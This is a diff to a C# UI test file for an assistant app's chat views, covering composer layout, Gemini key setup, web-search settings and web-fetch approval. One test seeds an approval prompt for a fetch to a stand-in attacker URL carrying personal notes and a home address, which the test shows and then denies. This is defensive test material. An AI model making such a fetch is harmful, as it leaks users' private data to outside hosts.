@@ -2,6 +2,7 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
 using Avalonia;
@@ -11,6 +12,7 @@ using Avalonia.Media.Imaging;
 using Avalonia.Threading;
 using Avalonia.VisualTree;
 using enki.Controls;
+using enki.Localization;
 using enki.Models;
 using enki.Services;
 using enki.ViewModels;
@@ -42,7 +44,7 @@ public sealed class AssistantViewUiTests : IDisposable
     }
 
     /// <summary>CLI mínimo: solo responde a la comprobación de versión, ayuda y sesión.</summary>
-    private string FakeCli(bool loggedIn, bool supportsEffort = true)
+    private string FakeCli(bool loggedIn, bool supportsEffort = true, bool supportsTools = false)
     {
         // El CLI vive fuera del almacenamiento privado: SettingsService restringe sus archivos a 0600.
         Directory.CreateDirectory(_cliDirectory);
@@ -51,7 +53,7 @@ public sealed class AssistantViewUiTests : IDisposable
             #!/bin/sh
             case "$1" in
               --version) echo "2.1.280 (Claude Code)";;
-              --help) echo "--output-format --include-partial-messages --resume --tools --safe-mode --model --system-prompt[-file] {{(supportsEffort ? "--effort" : "")}}";;
+              --help) echo "--output-format --include-partial-messages --resume --tools --safe-mode --model --system-prompt[-file] {{(supportsEffort ? "--effort" : "")}} {{(supportsTools ? "--mcp-config --strict-mcp-config --allowedTools --setting-sources --permission-mode" : "")}}";;
               auth) echo '{"loggedIn":{{(loggedIn ? "true" : "false")}},"authMethod":"claude.ai","email":"ana@example.com","subscriptionType":"pro"}';;
             esac
             """.Replace("\r\n", "\n", StringComparison.Ordinal) + "\n");
@@ -61,7 +63,7 @@ public sealed class AssistantViewUiTests : IDisposable
     }
 
     private (AssistantView View, AssistantViewModel Vm, Window Window, AiChatService Chats) Create(string cliPath,
-        Action<AiChatService, SettingsService>? seed = null)
+        Action<AiChatService, SettingsService>? seed = null, Func<SettingsService, VaultService, EnkiMcpServer>? vaultTools = null)
     {
         var settings = new SettingsService(_directory);
         settings.Settings.Ai.ClaudeCliPath = cliPath;
@@ -72,7 +74,8 @@ public sealed class AssistantViewUiTests : IDisposable
         var chats = new AiChatService(_directory);
         seed?.Invoke(chats, settings);
         var cli = new ClaudeCliService(settings, _directory);
-        var vm = new AssistantViewModel(cli, chats, settings, vault, new NotificationService(settings, _directory));
+        var vm = new AssistantViewModel(cli, chats, settings, vault, new NotificationService(settings, _directory),
+            vaultTools: vaultTools?.Invoke(settings, vault));
         var view = new AssistantView { DataContext = vm };
         var window = new Window { Content = view, Width = 1280, Height = 860, Background = new SolidColorBrush(Color.Parse("#121212")) };
         window.Show();
@@ -298,6 +301,69 @@ public sealed class AssistantViewUiTests : IDisposable
         }
     }
 
+    /// <summary>En la sección, un chat vacío centra el compositor en la vista, entre la bienvenida y las
+    /// sugerencias; con mensajes vuelve bajo el hilo. Es el mismo control en los dos huecos, así que el cuadro
+    /// de texto (y con él el borrador y el foco) no se recrea al cambiar.</summary>
+    [Fact]
+    public void Section_EmptyChat_CentersTheComposer_AndDocksItOnceTheChatHasMessages()
+    {
+        if (OperatingSystem.IsWindows()) return;
+        var (view, vm, window, _) = Create(FakeCli(loggedIn: true), (chats, _) =>
+        {
+            var chat = new AiChatSession { Title = "Con mensajes", VaultId = VaultId };
+            chat.Messages.Add(new AiChatMessage { Role = AiChatRole.User, Text = "Hola" });
+            chat.Messages.Add(new AiChatMessage { Role = AiChatRole.Assistant, Text = "¿En qué te ayudo?" });
+            chats.Save(chat);
+        });
+        try
+        {
+            var composer = view.GetVisualDescendants().OfType<AssistantComposerView>().Single();
+            var box = Find<TextBox>(view, "ComposerBox");
+            var docked = Find<Decorator>(view, "DockedComposerHost");
+            var welcome = Find<AssistantWelcomeView>(view, "Welcome");
+            var body = Assert.IsAssignableFrom<Control>(docked.Parent);
+
+            Assert.True(vm.ShowWelcome);
+            Assert.Same(welcome.Slot, composer.Parent);
+            Assert.Contains("hero", composer.Classes);
+            // La bienvenida del hilo compartido no se duplica detrás de la de la sección.
+            Assert.False(Find<Panel>(view, "WelcomeHost").IsEffectivelyVisible);
+            var surface = Find<Border>(view, "ComposerSurface");
+            var origin = surface.TranslatePoint(default, body)!.Value;
+            Assert.InRange(origin.X + surface.Bounds.Width / 2 - body.Bounds.Width / 2, -1, 1);
+            Assert.InRange(origin.Y + surface.Bounds.Height / 2 - body.Bounds.Height / 2, -1, 1);
+            Assert.True(surface.Bounds.Width >= 700, surface.Bounds.Width.ToString());
+            SavePreview(view, "assistant-welcome-centered");
+            box.Focus();
+            vm.DraftText = "Resume la nota abierta";
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+            SavePreview(view, "assistant-welcome-centered-focused");
+
+            vm.SelectSessionCommand.Execute(vm.Sessions.Single());
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+
+            Assert.False(vm.ShowWelcome);
+            Assert.Same(docked, composer.Parent);
+            Assert.DoesNotContain("hero", composer.Classes);
+            Assert.Same(box, Find<TextBox>(view, "ComposerBox"));
+            Assert.True(box.IsEffectivelyVisible);
+            Assert.Equal(body.Bounds.Height, docked.Bounds.Bottom, 1);
+
+            vm.NewChatCommand.Execute(null);
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+
+            Assert.Same(welcome.Slot, composer.Parent);
+            Assert.True(box.IsEffectivelyVisible);
+        }
+        finally
+        {
+            window.Close();
+        }
+    }
+
     [Fact]
     public void Ready_RestoredConversation_RendersMarkdownBlocksAndAttachments()
     {
@@ -395,7 +461,7 @@ public sealed class AssistantViewUiTests : IDisposable
         {
             var picker = Find<ComboBox>(view, "ProviderPicker");
             Assert.True(picker.IsEffectivelyVisible);
-            Assert.Equal(3, picker.ItemCount);
+            Assert.Equal(4, picker.ItemCount);
             Assert.Equal(AiProvider.OpenAi, ((AiProviderOption)picker.SelectedItem!).Provider);
             Assert.Contains("OpenAI", RenderedText(view));
             Assert.True(Find<TextBox>(view, "ComposerBox").IsEffectivelyVisible);
@@ -406,6 +472,123 @@ public sealed class AssistantViewUiTests : IDisposable
             Assert.False(picker.IsEnabled);
         }
         finally { window.Close(); }
+    }
+
+    /// <summary>Gemini sin clave enseña cómo conseguirla (sin órdenes de terminal) y, con una clave válida, el chat
+    /// con los modelos que la API lista para ella.</summary>
+    [Fact]
+    public async Task Gemini_AsksForAiStudioKey_ThenOffersItsModels()
+    {
+        var settings = new SettingsService(_directory);
+        settings.Settings.Ai.ConsentAcceptedUtc = DateTime.UtcNow;
+        settings.Settings.Ai.Enabled = true;
+        settings.Settings.Ai.Provider = AiProvider.Gemini;
+        var vault = new VaultService(settings);
+        vault.InitializeVault(Path.Combine(_directory, "vault"), seedWelcomeNote: false);
+        var keys = new AiApiKeyStore(new MemoryCredentialStore(), AiApiKeyKind.Gemini);
+        using var http = new HttpClient(new CatalogHandler());
+        var cli = new ClaudeCliService(settings, _directory);
+        var backend = new AiBackendService(cli, settings, _directory, gemini: new GeminiApiService(settings, keys, http));
+        var status = new ClaudeCliStatusViewModel(cli, backend: backend);
+        var vm = new AssistantViewModel(cli, new AiChatService(_directory), settings, vault, new NotificationService(settings, _directory),
+            status);
+        var view = new AssistantView { DataContext = vm };
+        var window = new Window { Content = view, Width = 1280, Height = 860, Background = new SolidColorBrush(Color.Parse("#121212")) };
+        window.Show();
+        try
+        {
+            vm.OnActivated();
+            Pump(() => vm.Cli.IsKnown && !vm.Cli.IsChecking);
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+            Assert.True(vm.ShowSetupPanel);
+            Assert.True(vm.ShowApiKeySetup);
+            Assert.False(vm.ShowSetupCommand);
+            var text = RenderedText(view);
+            Assert.Contains(LocalizationService.Instance["Ai_Gemini_Setup_Title"], text);
+            Assert.Contains(LocalizationService.Instance["Ai_Gemini_GetKey"].ToUpper(LocalizationService.Instance.CurrentCulture), text);
+            Assert.DoesNotContain(ClaudeCliService.LoginCommand, text);
+            SavePreview(view, "assistant-gemini-key");
+
+            keys.Write("AIzaSyA-0123456789abcdefghijklmnopWXYZ");
+            await vm.Cli.RefreshAsync();
+            Pump(() =>
+            {
+                window.GetLayoutManager()!.ExecuteLayoutPass();
+                return vm.Cli.IsReady && Find<TextBox>(view, "ComposerBox").IsEffectivelyVisible;
+            });
+            Assert.False(vm.ShowSetupPanel);
+            Assert.Equal(AiProvider.Gemini, ((AiProviderOption)Find<ComboBox>(view, "ProviderPicker").SelectedItem!).Provider);
+            Assert.Contains(vm.ModelOptions, o => o.Alias == "gemini-2.5-pro" && o.Label == "Gemini 2.5 Pro");
+            Assert.Equal(string.Empty, vm.SelectedModel!.Alias);
+            Assert.Contains("Google AI Studio · AIza…WXYZ", vm.Cli.AccountLabel);
+            SavePreview(view, "assistant-gemini");
+        }
+        finally { window.Close(); }
+    }
+
+    [Fact]
+    public void Settings_Gemini_ShowsKeyField_StudentNote_AndNoCliPath()
+    {
+        var settings = new SettingsService(_directory);
+        settings.Settings.Ai.ConsentAcceptedUtc = DateTime.UtcNow;
+        settings.Settings.Ai.Enabled = true;
+        settings.Settings.Ai.Provider = AiProvider.Gemini;
+        var vault = new VaultService(settings);
+        vault.InitializeVault(Path.Combine(_directory, "vault"), seedWelcomeNote: false);
+        var auth = new PolarAuthService(settings);
+        var sync = new PolarSyncService(auth, new SupabaseRestClient(auth), new PolarTaskService(_directory),
+            new ReminderService(_directory), settings);
+        var keys = new AiApiKeyStore(new MemoryCredentialStore(), AiApiKeyKind.Gemini);
+        keys.Write("AIzaSyA-0123456789abcdefghijklmnopWXYZ");
+        using var http = new HttpClient(new CatalogHandler());
+        var cli = new ClaudeCliService(settings, _directory);
+        var backend = new AiBackendService(cli, settings, _directory, gemini: new GeminiApiService(settings, keys, http));
+        var vm = new SettingsViewModel(settings, new CustomThemeService(settings), new BrandLogoService(_directory),
+            new VaultSettingsService(vault), vault, new VaultBackupService(vault, _directory), auth, sync,
+            new NotificationService(settings, _directory),
+            (_, _) => Task.FromResult(false), _ => { }, _ => { }, _ => { }, _ => { }, (_, _) => { }, () => { }, () => { },
+            _ => { }, _ => { }, _ => { }, _ => { }, () => { },
+            aiCliStatus: new ClaudeCliStatusViewModel(cli, backend: backend), aiChatService: new AiChatService(_directory));
+        var view = new SettingsView { DataContext = vm };
+        var window = new Window { Content = view, Width = 1280, Height = 1400, Background = new SolidColorBrush(Color.Parse("#121212")) };
+        window.Show();
+        try
+        {
+            vm.SelectSectionCommand.Execute(SettingsSection.Ai);
+            vm.CheckClaudeCliCommand.Execute(null);
+            Pump(() => vm.AiCliStatus!.IsReady && vm.AiModelOptions.Count > 2);
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+
+            var text = RenderedText(view);
+            Assert.True(vm.IsAiGemini);
+            Assert.Contains(LocalizationService.Instance["Ai_GeminiStudents"], text);
+            Assert.Contains(LocalizationService.Instance["Ai_Gemini_ApiKeyHelp"], text);
+            Assert.Contains("AIza…WXYZ", text);
+            Assert.DoesNotContain(LocalizationService.Instance["Settings_Ai_Cli_Path_Label"], text);
+            Assert.Contains(vm.AiModelOptions, o => o.Label == "Gemini 2.5 Pro");
+            SavePreview(view, "settings-ai-gemini", 1280, 1400);
+        }
+        finally { window.Close(); }
+    }
+
+    private sealed class MemoryCredentialStore : IPolarCredentialStore
+    {
+        private PolarCredentials? _credentials;
+        public PolarCredentials? Read() => _credentials;
+        public void Write(PolarCredentials credentials) => _credentials = credentials;
+        public void Delete() => _credentials = null;
+    }
+
+    private sealed class CatalogHandler : HttpMessageHandler
+    {
+        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) =>
+            Task.FromResult(new HttpResponseMessage(System.Net.HttpStatusCode.OK)
+            {
+                Content = new StringContent("""
+                    {"models":[{"name":"models/gemini-flash-latest","displayName":"Gemini Flash Latest","supportedGenerationMethods":["generateContent"]},
+                    {"name":"models/gemini-2.5-pro","displayName":"Gemini 2.5 Pro","supportedGenerationMethods":["generateContent"]}]}
+                    """, System.Text.Encoding.UTF8, "application/json")
+            });
     }
 
     [Fact]
@@ -526,6 +709,118 @@ public sealed class AssistantViewUiTests : IDisposable
     }
 
     [Fact]
+    public void WebAccess_GlobeToggle_WebActivity_AndUnknownAddressApproval()
+    {
+        if (OperatingSystem.IsWindows()) return;
+        EnkiMcpServer? server = null;
+        var (view, vm, window, _) = Create(FakeCli(loggedIn: true, supportsTools: true), (chats, settings) =>
+        {
+            var chat = new AiChatSession { Title = "Tiempo", VaultId = VaultId, WebAccess = true };
+            chat.Messages.Add(new AiChatMessage { Role = AiChatRole.User, Text = "¿Qué tiempo hará mañana en Sevilla?" });
+            chat.Messages.Add(new AiChatMessage
+            {
+                Role = AiChatRole.Assistant, Text = "Mañana, **24 °C** y despejado según [AEMET](https://www.aemet.es/).", Activities =
+                [
+                    new AiToolActivity { Tool = "web_search", Target = "tiempo Sevilla mañana", TargetKind = AiToolTargetKind.WebSearch, State = AiToolActivityState.Succeeded },
+                    new AiToolActivity { Tool = "web_fetch", Target = "Predicción para Sevilla", TargetKind = AiToolTargetKind.WebPage,
+                        TargetId = "https://www.aemet.es/es/eltiempo/prediccion/municipios/sevilla-id41091", State = AiToolActivityState.Succeeded }
+                ]
+            });
+            chats.Save(chat);
+            settings.Settings.Ai.LastChatByVault[VaultId] = chat.Id;
+        }, (settings, vault) => server = new EnkiMcpServer(new AiVaultToolbox(vault, new SessionService(vault), new KanbanService(_directory),
+            new PolarTaskService(_directory), new PolarAuthService(settings, baseUrl: "https://test.example", anonKey: "test"),
+            new ReminderService(_directory), settings)));
+        try
+        {
+            Assert.True(vm.VaultToolsAvailable);
+            var globe = Find<Button>(view, "WebAccessToggle");
+            Assert.True(globe.IsEffectivelyVisible);
+            Assert.Contains("on", globe.Classes);
+
+            var reply = vm.Messages.Last();
+            reply.IsActivitiesExpanded = true;
+            reply.PendingApproval = new AiApprovalViewModel(new AiApprovalRequest("web_fetch",
+                enki.Localization.LocalizedTextFormatter.Format("Assistant_Web_ApproveFetch"),
+                ["https://attacker.example/collect?notes=plan-semanal-y-direccion-completa-de-la-casa"],
+                enki.Localization.LocalizedTextFormatter.Format("Assistant_Web_ApproveFetch_Hint")));
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+
+            var text = RenderedText(view);
+            Assert.Contains("https://attacker.example/collect?notes=plan-semanal-y-direccion-completa-de-la-casa", text);
+            Assert.Contains(enki.Localization.LocalizationService.Instance["Assistant_Web_ApproveFetch_Hint"], text);
+            Assert.Contains("Predicción para Sevilla", text);
+            Assert.True(reply.Activities.Single(a => a.Model.Tool == "web_fetch").CanOpen);
+            Assert.False(reply.Activities.Single(a => a.Model.Tool == "web_search").CanOpen);
+            SavePreview(view, "assistant-web-activity-approval");
+
+            globe.Command!.Execute(null);
+            Dispatcher.UIThread.RunJobs();
+            Assert.DoesNotContain("on", globe.Classes);
+            Assert.False(vm.WebAccessEnabled);
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+            SavePreview(view, "assistant-web-off");
+            reply.PendingApproval.DenyCommand.Execute(null);
+        }
+        finally
+        {
+            window.Close();
+            server?.Dispose();
+        }
+    }
+
+    [Fact]
+    public void Settings_InternetAccess_ShowsEngineChoiceAndBraveKeyField()
+    {
+        var settings = new SettingsService(_directory);
+        settings.Settings.Ai.ConsentAcceptedUtc = DateTime.UtcNow;
+        settings.Settings.Ai.Enabled = true;
+        var vault = new VaultService(settings);
+        vault.InitializeVault(Path.Combine(_directory, "vault"), seedWelcomeNote: false);
+        var auth = new PolarAuthService(settings);
+        var sync = new PolarSyncService(auth, new SupabaseRestClient(auth), new PolarTaskService(_directory),
+            new ReminderService(_directory), settings);
+        var cli = new ClaudeCliService(settings, _directory);
+        using var web = new AiWebService(settings, new AiApiKeyStore(new MemoryCredentialStore(), AiApiKeyKind.BraveSearch));
+        var vm = new SettingsViewModel(settings, new CustomThemeService(settings), new BrandLogoService(_directory),
+            new VaultSettingsService(vault), vault, new VaultBackupService(vault, _directory), auth, sync,
+            new NotificationService(settings, _directory),
+            (_, _) => Task.FromResult(false), _ => { }, _ => { }, _ => { }, _ => { }, (_, _) => { }, () => { }, () => { },
+            _ => { }, _ => { }, _ => { }, _ => { }, () => { },
+            aiCliStatus: new ClaudeCliStatusViewModel(cli), aiChatService: new AiChatService(_directory), aiWebService: web);
+        var view = new SettingsView { DataContext = vm };
+        var window = new Window { Content = view, Width = 1280, Height = 1100, Background = new SolidColorBrush(Color.Parse("#121212")) };
+        window.Show();
+        try
+        {
+            vm.SelectSectionCommand.Execute(SettingsSection.Ai);
+            vm.SearchText = enki.Localization.LocalizationService.Instance["Settings_Ai_Web_NewChats_Label"];
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+
+            var text = RenderedText(view);
+            Assert.Contains(enki.Localization.LocalizationService.Instance["Settings_Ai_Web_DuckDuckGoHelp"], text);
+            Assert.DoesNotContain(enki.Localization.LocalizationService.Instance["Settings_Ai_Web_BraveHelp"], text);
+            SavePreview(view, "settings-ai-web-duckduckgo", 1280, 1100);
+
+            vm.UseBraveSearchCommand.Execute(null);
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+            text = RenderedText(view);
+            Assert.Contains(enki.Localization.LocalizationService.Instance["Settings_Ai_Web_BraveHelp"], text);
+            Assert.Contains(enki.Localization.LocalizationService.Instance["Settings_Ai_Web_BraveKey_None"], text);
+            var engines = view.GetVisualDescendants().OfType<RadioButton>().Where(r => r.GroupName == "AiWebEngine").ToList();
+            Assert.Equal([false, true], engines.Select(r => r.IsChecked == true));
+            SavePreview(view, "settings-ai-web-brave", 1280, 1100);
+        }
+        finally
+        {
+            window.Close();
+        }
+    }
+
+    [Fact]
     public void SidePanel_SharesTheConversationAndDraft_AndOpensHistoryOnDemand()
     {
         if (OperatingSystem.IsWindows()) return;
@@ -562,6 +857,18 @@ public sealed class AssistantViewUiTests : IDisposable
             Assert.True(vm.IsPanelHistoryOpen);
             Assert.True(panel.GetVisualDescendants().OfType<AssistantHistoryList>().Single().IsEffectivelyVisible);
             SavePreview(panel, "assistant-side-panel-history", 420, 860);
+
+            // Chat vacío en el panel: su propia bienvenida, con el compositor fijo abajo (no centrado).
+            Find<Button>(panel, "PanelHistoryToggle").Command!.Execute(null);
+            vm.NewChatCommand.Execute(null);
+            Dispatcher.UIThread.RunJobs();
+            window.GetLayoutManager()!.ExecuteLayoutPass();
+            Assert.True(Find<Panel>(panel, "WelcomeHost").IsEffectivelyVisible);
+            Assert.True(panel.GetVisualDescendants().OfType<AssistantWelcomeView>().Single().IsEffectivelyVisible);
+            var panelComposer = panel.GetVisualDescendants().OfType<AssistantComposerView>().Single();
+            Assert.DoesNotContain("hero", panelComposer.Classes);
+            Assert.Equal(panel.Bounds.Height, panelComposer.TranslatePoint(new Point(0, panelComposer.Bounds.Height), panel)!.Value.Y, 1);
+            SavePreview(panel, "assistant-side-panel-welcome", 420, 860);
         }
         finally { window.Close(); }
     }
